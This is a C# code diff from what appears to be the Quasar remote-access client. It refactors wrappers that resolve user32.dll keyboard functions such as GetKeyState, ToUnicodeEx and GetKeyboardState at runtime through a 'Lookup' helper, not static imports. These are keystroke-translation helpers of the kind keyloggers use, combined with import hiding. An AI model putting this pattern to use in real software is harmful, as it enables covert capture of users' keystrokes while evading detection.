@@ -62,7 +62,7 @@ namespace Quasar.Client.Utilities
             int uScanCode,
             byte[] lpbKeyState,
             byte[] lpwTransKey,
-            int fuState) => ClientNatives.Lookup<ToAsciiProc>("user32.dll", "ToAscii")(uVirtKey, uScanCode, lpbKeyState, lpwTransKey, fuState);
+            int fuState) => Lookup<ToAsciiProc>("user32.dll", "ToAscii")(uVirtKey, uScanCode, lpbKeyState, lpwTransKey, fuState);
 
         public delegate int ToUnicodeExProc(
         int wVirtKey,
@@ -127,7 +127,7 @@ namespace Quasar.Client.Utilities
             [Out][MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder pwszBuff,
             int cchBuff,
             int wFlags,
-            IntPtr dwhkl) => ClientNatives.Lookup<ToUnicodeExProc>("user32.dll", "ToUnicodeEx")(wVirtKey, wScanCode, lpKeyState, pwszBuff, cchBuff, wFlags, dwhkl);
+            IntPtr dwhkl) => Lookup<ToUnicodeExProc>("user32.dll", "ToUnicodeEx")(wVirtKey, wScanCode, lpKeyState, pwszBuff, cchBuff, wFlags, dwhkl);
 
         /// <summary>
         ///     The GetKeyboardState function copies the status of the 256 virtual keys to the
@@ -145,7 +145,7 @@ namespace Quasar.Client.Utilities
         /// </remarks>
         public delegate int GetKeyboardStateProc(byte[] pbKeyState);
         //[DllImport("user32.dll")]
-        public static int GetKeyboardState(byte[] pbKeyState) => ClientNatives.Lookup<GetKeyboardStateProc>("user32.dll", "GetKeyboardState")(pbKeyState);
+        public static int GetKeyboardState(byte[] pbKeyState) => Lookup<GetKeyboardStateProc>("user32.dll", "GetKeyboardState")(pbKeyState);
 
         public delegate short GetKeyStateProc(int vKey);
 
@@ -168,7 +168,7 @@ namespace Quasar.Client.Utilities
         /// </returns>
         /// <remarks>http://msdn.microsoft.com/en-us/library/ms646301.aspx</remarks>
         //[DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
-        public static short GetKeyState(int vKey) => ClientNatives.Lookup<GetKeyStateProc>("user32.dll", "GetKeyState")(vKey);
+        public static short GetKeyState(int vKey) => Lookup<GetKeyStateProc>("user32.dll", "GetKeyState")(vKey);
 
         internal delegate int MapVirtualKeyExProc(int uCode, int uMapType, IntPtr dwhkl);
         /// <summary>
@@ -186,7 +186,7 @@ namespace Quasar.Client.Utilities
         /// <param name="dwhkl">[in] The input locale identifier used to translate the specified code.</param>
         /// <returns></returns>
         //[DllImport("user32.dll", CharSet = CharSet.Auto)]
-        internal static int MapVirtualKeyEx(int uCode, int uMapType, IntPtr dwhkl) => ClientNatives.Lookup<MapVirtualKeyExProc>("user32.dll", "MapVirtualKeyExW")(uCode, uMapType, dwhkl);
+        internal static int MapVirtualKeyEx(int uCode, int uMapType, IntPtr dwhkl) => Lookup<MapVirtualKeyExProc>("user32.dll", "MapVirtualKeyExW")(uCode, uMapType, dwhkl);
 
         internal delegate IntPtr GetKeyboardLayoutProc(int dwLayout);
         /// <summary>
@@ -200,6 +200,6 @@ namespace Quasar.Client.Utilities
         ///     language and the high word contains a device handle to the physical layout of the keyboard.
         /// </returns>
         //[DllImport("user32.dll", CharSet = CharSet.Auto)]
-        internal static IntPtr GetKeyboardLayout(int dwLayout) => ClientNatives.Lookup<GetKeyboardLayoutProc>("user32.dll", "GetKeyboardLayout")(dwLayout);
+        internal static IntPtr GetKeyboardLayout(int dwLayout) => Lookup<GetKeyboardLayoutProc>("user32.dll", "GetKeyboardLayout")(dwLayout);
     }
 }
